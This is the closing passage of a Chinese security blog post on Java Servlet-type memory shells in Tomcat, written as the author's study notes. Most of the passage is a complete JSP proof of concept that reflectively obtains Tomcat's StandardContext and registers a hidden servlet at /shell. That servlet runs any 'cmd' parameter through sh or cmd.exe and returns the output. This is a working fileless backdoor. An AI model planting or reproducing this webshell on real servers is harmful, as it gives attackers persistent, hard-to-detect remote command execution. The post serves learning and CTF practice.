+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821120426994.png" alt="image-20250821120426994"></p>
+<p>成功弹出计算器，成功啦！</p>
+<p>但是这个poc其实还不够全面，一方面是runtime的exec函数只会返回一个proccess对象而不会返回命令执行回显内容，我们改进一下</p>
+<h2 id="04好用的POC"><a href="#04好用的POC" class="headerlink" title="04好用的POC"></a>04好用的POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%--&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">      <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">        isLinux = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      String[] cmdArray = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,cmd&#125;; <span class="comment">//根据操作系统选择shell</span></span><br><span class="line">      <span class="comment">//执行命令并获取命令输出</span></span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmdArray).getInputStream();</span><br><span class="line">      <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);  <span class="comment">//使用 Scanner 读取 InputStream 的内容</span></span><br><span class="line">      <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;  <span class="comment">//如果有内容就读取，否则为空字符串</span></span><br><span class="line">      <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();  <span class="comment">//获取 Servlet 输出流，用于返回给客户端（浏览器）</span></span><br><span class="line">      out.println(output);  <span class="comment">//打印输出</span></span><br><span class="line">      out.flush();</span><br><span class="line">      out.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="comment">//反射获取StandardContext</span></span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">  <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 更简单的方法 获取StandardContext</span></span><br><span class="line"><span class="comment">//    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);</span></span><br><span class="line"><span class="comment">//    reqF.setAccessible(true);</span></span><br><span class="line"><span class="comment">//    Request req = (Request) reqF.get(request);</span></span><br><span class="line"><span class="comment">//    StandardContext standardContext = (StandardContext) req.getContext();</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> servlet.getClass().getSimpleName();</span><br><span class="line">  <span class="type">Wrapper</span> <span class="variable">newwrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">  newwrapper.setName(name);</span><br><span class="line">  newwrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">  newwrapper.setServlet(servlet);</span><br><span class="line">  newwrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">  standardContext.addChild(newwrapper);</span><br><span class="line">  standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line"></span><br><span class="line">  out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话多了一个对操作系统的判断，根据Linux或者Windows操作系统去选择各自的shell，之后对命令的输出进行了一个获取和打印操作</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250821123359357.png" alt="image-20250821123359357"></p>
+<h2 id="完美撒花，小结一下"><a href="#完美撒花，小结一下" class="headerlink" title="完美撒花，小结一下"></a>完美撒花，小结一下</h2><p>第一个java的内存马就学完了，但其实后面会根据不同的waf去进行调整，例如无回显，打请求头注入，或者长度限制之类的，但其实收获还是很大的，因为自己遇到了一个做题的问题就是拿到源码后有点无从下手，我归结为是对这些源码的结构不够明确，对代码审计能力还需要提升，所以希望自己再继续努力吧</p>
+<p>关于servlet内存马，我觉得最重要的就是需要审计代码然后找到对应的context，也就是standardcontext，之后的话就是根据源码的实现去调用对应的函数去进行操作了</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-%E6%89%AF%E7%82%B9%E6%B2%A1%E7%94%A8%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">01 扯点没用的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">02 关于内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">什么是内存马？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">内存马的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E7%94%A8%E5%A4%84"><span class="toc-number">2.3.</span> <span class="toc-text">内存马的用处</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-1-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">03.1 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E4%B8%ADServlet%E5%AE%B9%E5%99%A8"><span class="toc-number">3.1.</span> <span class="toc-text">Tomcat中Servlet容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAServlet%E5%AE%9E%E6%93%8D"><span class="toc-number">3.2.</span> <span class="toc-text">编写一个Servlet实操</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9C%8BServlet%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">3.3.</span> <span class="toc-text">从代码层面看Servlet的生命周期</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Servlet%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.3.1.</span> <span class="toc-text">Servlet初始化流程分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Servlet%E8%A3%85%E8%BD%BD%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.3.2.</span> <span class="toc-text">Servlet装载流程分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Econtext%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%88%E6%BC%8F%E6%8E%89%E5%95%A6%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">关于context的获取（漏掉啦）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-2-Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">03.2 Servlet内存马实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFServlet%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">4.1.</span> <span class="toc-text">什么是Servlet内存马？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%9D%A1%E4%BB%B6%E5%92%8C%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F1"><span class="toc-number">4.2.</span> <span class="toc-text">Servlet内存马的条件和注入方式1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%ACPOC%E7%BC%96%E5%86%99"><span class="toc-number">4.3.</span> <span class="toc-text">内存马POC编写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-3%E5%AE%8C%E6%95%B4POC1"><span class="toc-number">5.</span> <span class="toc-text">03.3完整POC1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04%E5%A5%BD%E7%94%A8%E7%9A%84POC"><span class="toc-number">6.</span> <span class="toc-text">04好用的POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E7%BE%8E%E6%92%92%E8%8A%B1%EF%BC%8C%E5%B0%8F%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-number">7.</span> <span class="toc-text">完美撒花，小结一下</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&text=Java内存马之Servlet型内存马"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马之Servlet型内存马"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=Java内存马之Servlet型内存马"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java内存马之Servlet型内存马&body=Check out this article: https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马之Servlet型内存马"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马之Servlet型内存马"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马之Servlet型内存马"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马之Servlet型内存马"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&name=Java内存马之Servlet型内存马&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BServlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&t=Java内存马之Servlet型内存马"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
